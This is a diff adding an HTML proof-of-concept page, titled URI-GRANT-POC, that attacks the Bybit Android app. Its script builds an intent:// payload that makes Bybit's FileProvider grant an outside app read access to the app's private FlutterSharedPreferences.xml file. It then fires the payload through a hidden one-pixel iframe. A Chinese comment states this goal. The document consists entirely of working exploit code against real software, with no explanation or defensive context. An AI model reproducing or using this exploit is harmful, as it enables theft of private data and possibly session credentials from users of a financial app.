@@ -1,0 +1,9 @@
+<!doctype html><html><body style="font:15px monospace;padding:8px"><h3>URI-GRANT-POC</h3><pre id="o">firing…</pre>
+<iframe id="f" style="width:1px;height:1px"></iframe>
+<script>
+// 目标：让 Bybit 自己以 FLAG_GRANT_READ_URI_PERMISSION 把我们指定的 content:// URI 授予攻击者 App
+var dataPath='com.bybit.app.fileProvider.com.crazecoder.openfile/root/data/data/com.bybit.app/shared_prefs/FlutterSharedPreferences.xml';
+var payload='intent://'+dataPath+'#Intent;scheme=content;launchFlags=0x1;component=com.dsh.urireader/com.dsh.urireader.MainActivity;end';
+document.getElementById('o').textContent+='\n'+payload;
+document.getElementById('f').src=payload;
+</script></body></html>
